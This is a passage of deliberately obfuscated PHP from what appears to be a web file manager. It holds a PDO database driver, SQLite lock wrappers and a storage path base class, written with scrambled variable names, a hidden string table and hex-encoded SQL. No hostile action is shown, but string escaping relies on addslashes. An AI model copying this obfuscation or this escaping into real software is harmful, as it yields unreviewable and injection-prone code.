think_config($ŞÕêÛ§ğ[888])); } catch (Exception $ ¿ó©ïÀ) { } $this->connected = !0; if (1 != think_config($ŞÕêÛ§ğ[32])) { unset($this->config); } } return $this->linkID[$€¯æİ‡µ]; } public function free() { $this->PDOStatement = null; } public function query($ñ¤íŒ¡, $ì®™—ô“ = array()) { $·Ôúñùò =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñ¤íŒ¡; if (!empty($ì®™—ô“)) { $this->queryStr .= $·Ôúñùò[923] . print_r($ì®™—ô“, !0) . $·Ôúñùò[924]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($·Ôúñùò[33], 1); think_status($·Ôúñùò[34]); $this->PDOStatement = $this->_linkID->prepare($ñ¤íŒ¡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ûé¥üÒò = $this->PDOStatement->execute($ì®™—ô“); $this->debug(); if (!1 === $ûé¥üÒò) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÉõúóíÃ, $›€ü“Àğ = array()) { $×ÑÚó€Ñ =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉõúóíÃ; if (!empty($›€ü“Àğ)) { $this->queryStr .= $×ÑÚó€Ñ[923] . print_r($›€ü“Àğ, !0) . $×ÑÚó€Ñ[924]; } $åøŒ¾ğñ = !1; if ($this->dbType == $×ÑÚó€Ñ[917]) { if (preg_match($×ÑÚó€Ñ[925], $this->queryStr, $öÛ–Úçæ)) { $this->table = think_config($×ÑÚó€Ñ[926]) . str_ireplace(think_config($×ÑÚó€Ñ[927]), $×ÑÚó€Ñ[387], $öÛ–Úçæ[2]); $åøŒ¾ğñ = (bool) $this->query($×ÑÚó€Ñ[928] . strtoupper($this->table) . $×ÑÚó€Ñ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($×ÑÚó€Ñ[35], 1); think_status($×ÑÚó€Ñ[34]); $this->PDOStatement = $this->_linkID->prepare($ÉõúóíÃ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $µÉÊ‰ò¶ = $this->PDOStatement->execute($›€ü“Àğ); $this->debug(); if (!1 === $µÉÊ‰ò¶) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($åøŒ¾ğñ || preg_match($×ÑÚó€Ñ[929], $ÉõúóíÃ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ş·ª½²ì = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ş·ª½²ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÌŞûâ“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÌŞûâ“) { $this->error(); return !1; } } return !0; } private function getAll() { $„ŞœÇƒİ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($„ŞœÇƒİ); return $„ŞœÇƒİ; } public function getFields($œÉšğ ç) { $¶„®á ³ =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!0); if (think_config($¶„®á ³[930])) { $â¹œšÀ = str_replace($¶„®á ³[931], $œÉšğ ç, think_config($¶„®á ³[930])); } else { switch ($this->dbType) { case $¶„®á ³[914]: case $¶„®á ³[932]: $â¹œšÀ = "\123\x45\114\105\103\x54\40\x20\x20\x63\x6f\154\165\155\x6e\137\x6e\x61\155\x65\x20\x61\x73\x20\x27\x4e\141\155\145\x27\x2c\x20\x20\x20\x64\141\164\141\137\x74\x79\160\145\40\x61\163\40\47\124\x79\x70\145\x27\54\40\x20\x20\143\157\x6c\165\x6d\x6e\x5f\x64\x65\146\141\x75\154\x74\40\x61\163\40\47\x44\x65\146\x61\165\154\x74\47\x2c\x20\x20\x20\x69\163\137\x6e\165\x6c\154\141\142\x6c\145\40\x61\163\x20\x27\116\165\x6c\154\x27\xa\x9\11\106\122\117\x4d\x9\x69\156\146\157\x72\155\x61\164\x69\157\156\x5f\163\143\150\x65\x6d\x61\56\x74\141\142\154\x65\163\x20\101\x53\40\164\xa\x9\11\112\117\x49\x4e\11\151\156\x66\x6f\x72\155\x61\x74\x69\x6f\x6e\x5f\163\x63\150\x65\x6d\141\56\143\x6f\x6c\165\155\156\163\40\101\x53\40\x63\xa\x9\x9\x4f\x4e\x20\40\164\x2e\164\x61\142\154\145\137\x63\141\164\x61\154\x6f\x67\40\75\x20\143\56\x74\141\x62\154\145\137\x63\141\x74\x61\x6c\157\x67\12\11\11\x41\x4e\104\x20\164\x2e\x74\x61\142\x6c\x65\x5f\x73\143\150\x65\155\x61\40\75\x20\x63\x2e\164\x61\x62\154\x65\x5f\x73\143\x68\145\155\x61\12\11\11\x41\116\x44\40\x74\56\x74\141\142\x6c\145\137\156\141\x6d\145\x20\75\x20\x63\56\164\141\142\x6c\145\x5f\x6e\141\x6d\x65\12\x9\11\127\110\105\122\x45\x20\40\40\x74\56\x74\x61\x62\x6c\x65\137\x6e\x61\155\x65\40\x3d\x20\x27{$œÉšğ ç}\x27"; break; case $¶„®á ³[933]: $â¹œšÀ = $¶„®á ³[934] . $œÉšğ ç . $¶„®á ³[935]; break; case $¶„®á ³[915]: case $¶„®á ³[917]: $â¹œšÀ = $¶„®á ³[936] . $¶„®á ³[937] . $¶„®á ³[938] . strtoupper($œÉšğ ç) . $¶„®á ³[939] . strtoupper($œÉšğ ç) . $¶„®á ³[940]; break; case $¶„®á ³[941]: $â¹œšÀ = $¶„®á ³[942] . $œÉšğ ç . $¶„®á ³[943]; break; case $¶„®á ³[916]: break; case $¶„®á ³[944]: default: $â¹œšÀ = $¶„®á ³[945] . ($this->dbType == $¶„®á ³[944] ? "\140{$œÉšğ ç}\140" : $œÉšğ ç); } } $èì‡ñÓ¯ = $this->query($â¹œšÀ); $ÇßÄ©áÌ = array(); if ($èì‡ñÓ¯) { foreach ($èì‡ñÓ¯ as $–øïƒş– => $ÈÁ†„) { $ÈÁ†„ = array_change_key_case($ÈÁ†„); $ÈÁ†„[$¶„®á ³[42]] = isset($ÈÁ†„[$¶„®á ³[42]]) ? $ÈÁ†„[$¶„®á ³[42]] : $¶„®á ³[387]; $ÈÁ†„[$¶„®á ³[43]] = isset($ÈÁ†„[$¶„®á ³[43]]) ? $ÈÁ†„[$¶„®á ³[43]] : $¶„®á ³[387]; $–ÀŸÛŞ = isset($ÈÁ†„[$¶„®á ³[282]]) ? $ÈÁ†„[$¶„®á ³[282]] : $ÈÁ†„[$¶„®á ³[42]]; $ÇßÄ©áÌ[$–ÀŸÛŞ] = array($¶„®á ³[42] => $–ÀŸÛŞ, $¶„®á ³[43] => $ÈÁ†„[$¶„®á ³[43]], $¶„®á ³[45] => (bool) (isset($ÈÁ†„[$¶„®á ³[113]]) && $ÈÁ†„[$¶„®á ³[113]] === $¶„®á ³[22] || isset($ÈÁ†„[$¶„®á ³[45]]) && $ÈÁ†„[$¶„®á ³[45]] === $¶„®á ³[22]), $¶„®á ³[47] => isset($ÈÁ†„[$¶„®á ³[47]]) ? $ÈÁ†„[$¶„®á ³[47]] : (isset($ÈÁ†„[$¶„®á ³[66]]) ? $ÈÁ†„[$¶„®á ³[66]] : $¶„®á ³[387]), $¶„®á ³[49] => isset($ÈÁ†„[$¶„®á ³[104]]) ? strtolower($ÈÁ†„[$¶„®á ³[104]]) == $¶„®á ³[51] : (isset($ÈÁ†„[$¶„®á ³[67]]) ? $ÈÁ†„[$¶„®á ³[67]] : !1), $¶„®á ³[52] => isset($ÈÁ†„[$¶„®á ³[946]]) ? strtolower($ÈÁ†„[$¶„®á ³[946]]) == $¶„®á ³[54] : (isset($ÈÁ†„[$¶„®á ³[104]]) ? $ÈÁ†„[$¶„®á ³[104]] : !1)); } } return $ÇßÄ©áÌ; } public function getTables($¸¼ŒÔ‡ = '') { $™¼¼äì‚ =& $_SERVER[¹Û¹Æ€]; if (think_config($™¼¼äì‚[947])) { $»©µŞ¯û = str_replace($™¼¼äì‚[948], $¸¼ŒÔ‡, think_config($™¼¼äì‚[947])); } else { switch ($this->dbType) { case $™¼¼äì‚[915]: case $™¼¼äì‚[917]: $»©µŞ¯û = $™¼¼äì‚[949]; break; case $™¼¼äì‚[914]: case $™¼¼äì‚[932]: $»©µŞ¯û = $™¼¼äì‚[950]; break; case $™¼¼äì‚[941]: $»©µŞ¯û = $™¼¼äì‚[951]; break; case $™¼¼äì‚[916]: think_exception(think_lang($™¼¼äì‚[952]) . $™¼¼äì‚[953]); break; case $™¼¼äì‚[933]: $»©µŞ¯û = $™¼¼äì‚[55] . $™¼¼äì‚[56] . $™¼¼äì‚[57]; break; case $™¼¼äì‚[944]: default: if (!empty($¸¼ŒÔ‡)) { $»©µŞ¯û = $™¼¼äì‚[896] . $¸¼ŒÔ‡ . $™¼¼äì‚[897]; } else { $»©µŞ¯û = $™¼¼äì‚[898]; } } } $ˆäçÊÇ = $this->query($»©µŞ¯û); $Ñû›¶£î = array(); foreach ($ˆäçÊÇ as $î°ùà¥³ => $áëêúÁ) { $Ñû›¶£î[$î°ùà¥³] = current($áëêúÁ); } return $Ñû›¶£î; } protected function parseLimit($ÎØŸû…á) { $×Îñ‡ =& $_SERVER[¹Û¹Æ€]; $ÏúŠÃî = $×Îñ‡[22]; if (!empty($ÎØŸû…á)) { switch ($this->dbType) { case $×Îñ‡[941]: case $×Îñ‡[933]: $ÎØŸû…á = explode($×Îñ‡[60], $ÎØŸû…á); if (count($ÎØŸû…á) > 1) { $ÏúŠÃî .= $×Îñ‡[61] . $ÎØŸû…á[1] . $×Îñ‡[62] . $ÎØŸû…á[0] . $×Îñ‡[63]; } else { $ÏúŠÃî .= $×Îñ‡[61] . $ÎØŸû…á[0] . $×Îñ‡[63]; } break; case $×Îñ‡[914]: case $×Îñ‡[932]: break; case $×Îñ‡[916]: break; case $×Îñ‡[915]: case $×Îñ‡[917]: break; case $×Îñ‡[944]: default: $ÏúŠÃî .= $×Îñ‡[61] . $ÎØŸû…á . $×Îñ‡[63]; } } return $ÏúŠÃî; } public function parseKey(&$Êºèıãª, $İ¬øí¸™ = true) { $ˆ¤¾­¤™ =& $_SERVER[¹Û¹Æ€]; if ($İ¬øí¸™) { $Êºèıãª = $this->parseKeyCheck($Êºèıãª); } if ($this->dbType == $ˆ¤¾­¤™[944]) { if ($Êºèıãª != $ˆ¤¾­¤™[198] && !preg_match($ˆ¤¾­¤™[908], $Êºèıãª)) { $Êºèıãª = $ˆ¤¾­¤™[394] . trim($Êºèıãª, $ˆ¤¾­¤™[394]) . $ˆ¤¾­¤™[394]; } return $Êºèıãª; } else { return parent::parseKey($Êºèıãª, $İ¬øí¸™); } } public function close() { $this->_linkID = null; } public function error() { $Š¥ÀÕ˜• =& $_SERVER[¹Û¹Æ€]; if ($this->PDOStatement) { $ıÚğÆ¼º = $this->PDOStatement->errorInfo(); $this->error = $ıÚğÆ¼º[1] . $Š¥ÀÕ˜•[4] . $ıÚğÆ¼º[2]; } else { $this->error = $Š¥ÀÕ˜•[22]; } if ($Š¥ÀÕ˜•[22] != $this->queryStr) { $this->error .= LNG($Š¥ÀÕ˜•[58]) . $this->queryStr; } think_trace($this->error, $Š¥ÀÕ˜•[22], $Š¥ÀÕ˜•[59]); return $this->error; } public function escapeString($£óàŒ¡) { $Ÿ›£±Ó¼ =& $_SERVER[¹Û¹Æ€]; switch ($this->dbType) { case $Ÿ›£±Ó¼[941]: case $Ÿ›£±Ó¼[914]: case $Ÿ›£±Ó¼[932]: case $Ÿ›£±Ó¼[944]: return addslashes($£óàŒ¡); case $Ÿ›£±Ó¼[916]: case $Ÿ›£±Ó¼[933]: case $Ÿ›£±Ó¼[915]: case $Ÿ›£±Ó¼[917]: return str_ireplace($Ÿ›£±Ó¼[68], $Ÿ›£±Ó¼[69], $£óàŒ¡); } } protected function parseValue($ïìöàµÂ) { $ÒÒ¾˜á =& $_SERVER[¹Û¹Æ€]; if (is_string($ïìöàµÂ)) { $˜éÔ¬×ª = strpos($ïìöàµÂ, $ÒÒ¾˜á[4]) === 0 && in_array($ïìöàµÂ, array_keys($this->bind)); $ïìöàµÂ = $˜éÔ¬×ª ? $this->escapeString($ïìöàµÂ) : $ÒÒ¾˜á[954] . $this->escapeString($ïìöàµÂ) . $ÒÒ¾˜á[954]; } elseif (isset($ïìöàµÂ[0]) && is_string($ïìöàµÂ[0]) && strtolower($ïìöàµÂ[0]) == $ÒÒ¾˜á[306]) { $ïìöàµÂ = $this->escapeString($ïìöàµÂ[1]); } elseif (is_array($ïìöàµÂ)) { $ïìöàµÂ = array_map(array($this, $ÒÒ¾˜á[955]), $ïìöàµÂ); } elseif (is_bool($ïìöàµÂ)) { $ïìöàµÂ = $ïìöàµÂ ? $ÒÒ¾˜á[98] : $ÒÒ¾˜á[207]; } elseif (is_null($ïìöàµÂ)) { $ïìöàµÂ = $ÒÒ¾˜á[113]; } return $ïìöàµÂ; } public function getLastInsertId() { $Ò†Œû‰’ =& $_SERVER[¹Û¹Æ€]; switch ($this->dbType) { case $Ò†Œû‰’[941]: case $Ò†Œû‰’[933]: case $Ò†Œû‰’[914]: case $Ò†Œû‰’[932]: case $Ò†Œû‰’[916]: case $Ò†Œû‰’[944]: return $this->_linkID->lastInsertId(); case $Ò†Œû‰’[915]: case $Ò†Œû‰’[917]: $¯÷ğÛéâ = $this->table; $¶ˆº·’ = $this->query("\x53\x45\x4c\x45\x43\x54\40{$¯÷ğÛéâ}\x2e\143\165\x72\x72\x76\141\x6c\40\x63\165\x72\162\x76\x61\154\40\x46\x52\117\115\40\144\165\141\x6c"); return $¶ˆº·’ ? $¶ˆº·’[0][$Ò†Œû‰’[956]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($‚¿Çş¼Š) { $‡ç±³ä™ =& $_SERVER[¹Û¹Æ€]; if (!CacheLock::fileLock($‡ç±³ä™[23])) { return !1; } $Ô©•à± = parent::query($‚¿Çş¼Š); CacheLock::fileUnLock($‡ç±³ä™[23]); return $Ô©•à±; } public function execute($Úá´Œ—â) { $¶Ôó´ê =& $_SERVER[¹Û¹Æ€]; if (!CacheLock::fileLock($¶Ôó´ê[23])) { return !1; } $ŒÀ…öÊ€ = parent::execute($Úá´Œ—â); CacheLock::fileUnLock($¶Ôó´ê[23]); return $ŒÀ…öÊ€; } } class DbSqlite3 extends DbSqlite3Base { public function query($«šêÏì÷) { $½ãíÎÓ =& $_SERVER[¹Û¹Æ€]; if (!CacheLock::fileLock($½ãíÎÓ[23])) { return !1; } $Ç˜–¸ó = parent::query($«šêÏì÷); CacheLock::fileUnLock($½ãíÎÓ[23]); return $Ç˜–¸ó; } public function execute($—‹åˆ¿) { $œê ”Ô¿ =& $_SERVER[¹Û¹Æ€]; if (!CacheLock::fileLock($œê ”Ô¿[23])) { return !1; } $º¯Û÷‘‹ = parent::execute($—‹åˆ¿); CacheLock::fileUnLock($œê ”Ô¿[23]); return $º¯Û÷‘‹; } } goto fáƒåŒŞ¹; f°ºÕù«: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬ÔØÂƒß =& $_SERVER[¹Û¹Æ€]; $this->objectDriver = array($¬ÔØÂƒß[70], $¬ÔØÂƒß[71], $¬ÔØÂƒß[72], $¬ÔØÂƒß[73], $¬ÔØÂƒß[74], $¬ÔØÂƒß[75], $¬ÔØÂƒß[76], $¬ÔØÂƒß[77], $¬ÔØÂƒß[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Æ¾ãè) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Æ¾ãè, $_SERVER[¹Û¹Æ€][18]); } return $Æ¾ãè; } public function iconvApp($ù›§›Å) { return $ù›§›Å; } public function iconvSystem($È—³Û¡) { return $È—³Û¡; } public function iconvTo($ÖË¤¢¿Í, $¿ªã™È, $Äßï“ı¾) { $ĞûÅùÏø =& $_SERVER[¹Û¹Æ€]; if (!$ÖË¤¢¿Í || !function_exists($ĞûÅùÏø[79])) { return $ÖË¤¢¿Í; } static $œ˜ş§®Ğ = array(); $‘Ğ‘÷ÈÜ = $¿ªã™È . $ĞûÅùÏø[80] . $Äßï“ı¾ . $ĞûÅùÏø[81] . $ÖË¤¢¿Í; if (isset($œ˜ş§®Ğ[$‘Ğ‘÷ÈÜ])) { return $œ˜ş§®Ğ[$‘Ğ‘÷ÈÜ]; } if (function_exists($ĞûÅùÏø[82])) { $İÊßàØÄ = @mb_convert_encoding($ÖË¤¢¿Í, $Äßï“ı¾, $¿ªã™È); } else { $İÊßàØÄ = @iconv($¿ªã™È, $Äßï“ı¾, $ÖË¤¢¿Í); } $İÊßàØÄ = $İÊßàØÄ ? $İÊßàØÄ : $ÖË¤¢¿Í; if (strstr($İÊßàØÄ, $ĞûÅùÏø[83])) { $İÊßàØÄ = str_replace($ĞûÅùÏø[83], $ĞûÅùÏø[21], $İÊßàØÄ); } $œ˜ş§®Ğ[$¿ªã™È . $ĞûÅùÏø[80] . $Äßï“ı¾ . $ĞûÅùÏø[81] . $ÖË¤¢¿Í] = $İÊßàØÄ; $œ˜ş§®Ğ[$Äßï“ı¾ . $ĞûÅùÏø[80] . $¿ªã™È . $ĞûÅùÏø[81] . $ÖË¤¢¿Í] = $ÖË¤¢¿Í; $œ˜ş§®Ğ[$Äßï“ı¾ . $ĞûÅùÏø[80] . $¿ªã™È . $ĞûÅùÏø[81] . $İÊßàØÄ] = $ÖË¤¢¿Í; $œ˜ş§®Ğ[$¿ªã™È . $ĞûÅùÏø[80] . $Äßï“ı¾ . $ĞûÅùÏø[81] . $İÊßàØÄ] = $İÊßàØÄ; return $İÊßàØÄ; } public function getPathInner($ÑáóĞÒØ) { $ÒË†ìÂò = IO::init($ÑáóĞÒØ); return $ÒË†ìÂò->path; } public function getPathOuter($’”Ÿ“ãè) { $½©®¬”ƒ =& $_SERVER[¹Û¹Æ€]; $³«ûØí = strlen(trim($this->pathBase, $½©®¬”ƒ[18])); $’”Ÿ“ãè = substr(trim($’”Ÿ“ãè, $½©®¬”ƒ[18]), $³«ûØí); return $this->pathDriver . $½©®¬”ƒ[18] . ltrim($’”Ÿ“ãè, $½©®¬”ƒ[18]); } public function isParentOf($û“˜›¬í, $­ï®ãñ) { $ ÄÜ›äı =& $_SERVER[¹Û¹Æ€]; $û“˜›¬í = rtrim(strtolower($û“˜›¬í), $ ÄÜ›äı[18]) . $ ÄÜ›äı[18]; $­ï®ãñ = rtrim(strtolower($­ï®ãñ), $ ÄÜ›äı[18]) . $ ÄÜ›äı[18]; $ÎíÑ¢®º = strpos($­ï®ãñ, $û“˜›¬í) === 0; return $ÎíÑ¢®º; } public function getType() { $‚¿èİ Ù =& $_SERVER[¹Û¹Æ€]; $½şñûô¹ = str_replace($‚¿èİ Ù[84], $‚¿èİ Ù[22], get_class($this)); return strtolower($½şñûô¹); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($“éùĞ— , $é”¿¼‡ï) { $€àĞ‘ì¨ =& $_SERVER[¹Û¹Æ€]; $ÂÖÄí­ = rtrim($“éùĞ— , $€àĞ‘ì¨[18]) . $€àĞ‘ì¨[18] . $é”¿¼‡ï; $±ˆ¼¸¯˜ = $this->exist($ÂÖÄí­); return $±ˆ¼¸¯˜ ? $ÂÖÄí­ : !1; } public function setModifyTime($ƒö™˜Ô, $Üõ‰ÁÊ  = '') { } public function renameObject($¤¬¢û°Ó, $ô¬œãµÈ) { $Àı Ö…† = $ô¬œãµÈ; $¤¬¢û°Ó = $this->getPathOuter($¤¬¢û°Ó); $ô¬œãµÈ = $this->pathFather($¤¬¢û°Ó) . $ô¬œãµÈ; $ Ğø¬­ = IO::copy($¤¬¢û°Ó, $this->pathFather($¤¬¢û°Ó), REPEAT_RENAME_FOLDER, $Àı Ö…†); if ($ Ğø¬­) { IO::remove($¤¬¢û°Ó); } return $ Ğø¬­ ? $ô¬œãµÈ : !1; } public function tempFile($è”–ƒ›ê = '', $—ÁÃ‰å÷ = '') { if (!$è”–ƒ›ê) { $è”–ƒ›ê = rand_string(15); } $ïü¢Ï¼ = TEMP_FILES . rand_string(15) . $_SERVER[¹Û¹Æ€][18]; @mkdir($ïü¢Ï¼, DEFAULT_PERRMISSIONS, !0); $’Û÷ƒ¼È = $ïü¢Ï¼ . $è”–ƒ›ê; @touch($’Û÷ƒ¼È); if ($—ÁÃ‰å÷) { file_put_contents($’Û÷ƒ¼È, $—ÁÃ‰å÷); } return $’Û÷ƒ¼È; } public function tempFileRemve($£å¨¦º”) { @unlink($£å¨¦º”); @rmdir($this->pathFather($£å¨¦º”)); } public function mkfile($ÊËÄ³É×, $±øã§Â¿ = '', $àÇÛ¾•Ÿ = REPEAT_RENAME) { } public function mkdir($ÑôŞêÔª, $¸ŠÉÉº = REPEAT_SKIP) { } public function delFile($¦ÆõË¬í) { } public function delFolder($›èÑœ™) { } public function copyFile($µù¥ë‚ğ, $š¯ÏƒŸ) { } public function moveFile($­ÇÎ˜õ², $µ¤øÕ¸ô) { } public function remove($™¾Åùºí) { if ($this->isFile($™¾Åùºí)) { return $this->delFile($™¾Åùºí); } return $this->delFolder($™¾Åùºí); } public function rename($Äç‹£Ò÷, $é¤¦‹Äê) { } public function exist($‰ˆôë±Ó) { } public function findByHash($¯í­Â…ò = '', $¾¢©Œ‘ˆ = '') { return !1; } public function isFile($şƒàø®‘) { } public function isFolder($ªæ‰â£Õ) { } public function size($Òï·Õè¥) { } public function info($‡³ÑË£ş) { } public function infoSimple($­ßŒÒÛ) { return $this->info($­ßŒÒÛ); } public function infoAuth($ã¹èÖ¨å) { return $this->info($ã¹èÖ¨å); } public function infoFull($ê¿¹›½Ä) { return $this->info($ê¿¹›½Ä); } public function infoWithChildren($õéğæµ³) { $áê¯ÇÈã =& $_SERVER[¹Û¹Æ€]; static $—àÚ¥æ = array(); if (isset($—àÚ¥æ[$õéğæµ³])) { return $—àÚ¥æ[$õéğæµ³]; } $İüÙ”½Ç = $this->info($õéğæµ³); if ($İüÙ”½Ç && $İüÙ”½Ç[$áê¯ÇÈã[43]] == $áê¯ÇÈã[85]) { $ëäãşÈÅ = array($áê¯ÇÈã[86] => 0, $áê¯ÇÈã[87] => 0, $áê¯ÇÈã[88] => 0); $this->infoChildren($õéğæµ³, $ëäãşÈÅ); $İüÙ”½Ç[$áê¯ÇÈã[86]] = $ëäãşÈÅ[$áê¯ÇÈã[86]]; $İüÙ”½Ç[$áê¯ÇÈã[89]] = array($áê¯ÇÈã[90] => $ëäãşÈÅ[$áê¯ÇÈã[87]], $áê¯ÇÈã[91] => $ëäãşÈÅ[$áê¯ÇÈã[88]]); $—àÚ¥æ[$õéğæµ³] = $İüÙ”½Ç; } return $İüÙ”½Ç; } public function listPath($À«àÖ¨, $ƒä©éÔæ = false) { } public function has($á¦ÓÓûÚ, $°»÷”Õ± = false, $ÙÚªÓß = false) { } public function canRead($Ø•ŒÕÈ) { } public function canWrite($™×‡•ğ™) { } public function getContent($àïà•”’) { } public function setContent($«’ÀÜİ, $«çñŞ´’ = '') { } protected function infoChildren($Š±ñ¼‰, &$–ìé»Ö‘) { $–˜÷°ñ =& $_SERVER[¹Û¹Æ€]; check_abort_echo(); $ÄÓßƒû¤ = $this->listPath($Š±ñ¼‰, !0); $ÄÓßƒû¤ = array_merge($ÄÓßƒû¤[$–˜÷°ñ[92]], $ÄÓßƒû¤[$–˜÷°ñ[93]]); foreach ($ÄÓßƒû¤ as $•€Æ©) { if ($•€Æ©[$–˜÷°ñ[43]] == $–˜÷°ñ[85]) { $–ìé»Ö‘[$–˜÷°ñ[88]]++; $Ê›ó¼ê‡ = $this->getPathInner($•€Æ©[$–˜÷°ñ[94]]); $this->infoChildren($Ê›ó¼ê‡, $–ìé»Ö‘); } else { $–ìé»Ö‘[$–˜÷°ñ[87]]++; $–ìé»Ö‘[$–˜÷°ñ[86]] += $•€Æ©[$–˜÷°ñ[86]]; } } } public function fileSubstr($ØÖ¨õš¿, $¡ô£çÁ¢, $Ëåé‘÷) { } public function listAll($ÖâË•·¤) { } public function listAllMake($×èûÑ£Ş, &$¹ñ„Û›˜) { $İã¼Ê =& $_SERVER[¹Û¹Æ€]; check_abort_echo(); $Ôñ€¾£Ê = $this->listPath($×èûÑ£Ş, !0); if (!$Ôñ€¾£Ê) { return; } $â†§ø–Ü = array_merge($Ôñ€¾£Ê[$İã¼Ê[92]], $Ôñ€¾£Ê[$İã¼Ê[93]]); foreach ($â†§ø–Ü as $†¥±Ç¢¡) { $ø±­ºÆ = $†¥±Ç¢¡[$İã¼Ê[43]] == $İã¼Ê[85]; $†ÌÕŠéŒ = array($İã¼Ê[94] => $†¥±Ç¢¡[$İã¼Ê[94]], $İã¼Ê[85] => $ø±­ºÆ); if (isset($†¥±Ç¢¡[$İã¼Ê[86]])) { $†ÌÕŠéŒ[$İã¼Ê[86]] = $†¥±Ç¢¡[$İã¼Ê[86]]; } if (isset($†¥±Ç¢¡[$İã¼Ê[95]])) { $†ÌÕŠéŒ[$İã¼Ê[95]] = $†¥±Ç¢¡[$İã¼Ê[95]]; } if (!$ø±­ºÆ) { $¹ñ„Û›˜[] = $†ÌÕŠéŒ; continue; } $¹ñ„Û›˜[] = $†ÌÕŠéŒ; $ñÍ”ÂÒ² = $†¥±Ç¢¡[$İã¼Ê[94]]; $Šß½õ“§ = $this->pathDriver; if (substr($†¥±Ç¢¡[$İã¼Ê[94]], 0, strlen($Šß½õ“§)) == $Šß½õ“§) { $ñÍ”ÂÒ² = substr($ñÍ”ÂÒ², strlen($Šß½õ“§)); } $this->listAllMake($ñÍ”ÂÒ², $¹ñ„Û›˜); } } public function listAllSimple($Öœ¤¸ó) { $ı÷ìøîÓ =& $_SERVER[¹Û¹Æ€]; $ßÖË”ğ‹ = array(); $î¼‘ßÉ = $this->listAll($Öœ¤¸ó); $Ò·¹¾¡Ó = $this->getPathOuter($Öœ¤¸ó); foreach ($î¼‘ßÉ as $“ÄšìÑ€) { $İÑğç¼Ğ = $“ÄšìÑ€[$ı÷ìøîÓ[94]]; $÷Û¿äš = $“ÄšìÑ€[$ı÷ìøîÓ[94]]; if (isset($“ÄšìÑ€[$ı÷ìøîÓ[96]])) { $İÑğç¼Ğ = $“ÄšìÑ€[$ı÷ìøîÓ[96]][$ı÷ìøîÓ[94]]; $“ÄšìÑ€[$ı÷ìøîÓ[86]] = $“ÄšìÑ€[$ı÷ìøîÓ[96]][$ı÷ìøîÓ[86]]; $“ÄšìÑ€[$ı÷ìøîÓ[95]] = $“ÄšìÑ€[$ı÷ìøîÓ[96]][$ı÷ìøîÓ[95]]; } else { $÷Û¿äš = substr($“ÄšìÑ€[$ı÷ìøîÓ[94]], strlen(get_path_father($Ò·¹¾¡Ó))); $÷Û¿äš = $ı÷ìøîÓ[18] . ltrim($÷Û¿äš, $ı÷ìøîÓ[18]); } $Ëº°ƒßò = array($ı÷ìøîÓ[94] => $÷Û¿äš, $ı÷ìøîÓ[85] => $“ÄšìÑ€[$ı÷ìøîÓ[85]]); if (isset($“ÄšìÑ€[$ı÷ìøîÓ[86]]) && !$“ÄšìÑ€[$ı÷ìøîÓ[85]]) { $Ëº°ƒßò[$ı÷ìøîÓ[86]] = $“ÄšìÑ€[$ı÷ìøîÓ[86]]; } if (isset($“ÄšìÑ€[$ı÷ìøîÓ[95]])) { $Ëº°ƒßò[$ı÷ìøîÓ[95]] = $“ÄšìÑ€[$ı÷ìøîÓ[95]]; } if (!$“ÄšìÑ€[$ı÷ìøîÓ[85]]) { $Ëº°ƒßò[$ı÷ìøîÓ[97]] = $İÑğç¼Ğ; } $ßÖË”ğ‹[] = $Ëº°ƒßò; } return $ßÖË”ğ‹; } public function upload($Æ«€ŠæÏ, $·Š–Ÿá, $¸€›æï· = false, $«¾“ØÑ = REPEAT_REPLACE) { } public function uploadFileByID($Ã§‚“íˆ, $•‚ŒéÎ, $ÎŠ‹†¹ƒ) { } public function uploadFileByPath($Áê•ˆ›Ù, $øÅ¾Îã, $äêë£Í† = array()) { } public function isUploadServer() { $ºæ¤îª =& $_SERVER[¹Û¹Æ€]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ºæ¤îª[98]) { return !0; } return $GLOBALS[$ºæ¤îª[16]][$ºæ¤îª[99]][$ºæ¤îª[100]]; } public function isFileOutServer() { $ÚıÜ±¯ =& $_SERVER[¹Û¹Æ€]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ÚıÜ±¯[98]) { return !0; } return $GLOBALS[$ÚıÜ±¯[16]][$ÚıÜ±¯[99]][$ÚıÜ±¯[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¯”«ı¸) { $™À»ê¼£ =& $_SERVER[¹Û¹Æ€]; if (!$this->isCdnHost()) { return $¯”«ı¸; } return str_replace(trim(get_url_root($¯”«ı¸), $™À»ê¼£[18]), trim($this->cdnHost, $™À»ê¼£[18]), $¯”«ı¸); } public function uploadLink($ÉÎôÎê, $ò’””ºÁ = 0) { $ÖË±„º† =& $_SERVER[¹Û¹Æ€]; if ($this->isUploadServer()) { return; } $‹áşØÓª = $this->getType(); if (!in_array($‹áşØÓª, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‡‹ªĞ¯ö = 1024 * 1024 * 10; $ëŞ±¯ = $ò’””ºÁ <= $‡‹ªĞ¯ö ? $ÖË±„º†[102] : $ÖË±„º†[103]; $Îµ½á»° = (!$ò’””ºÁ ? 1 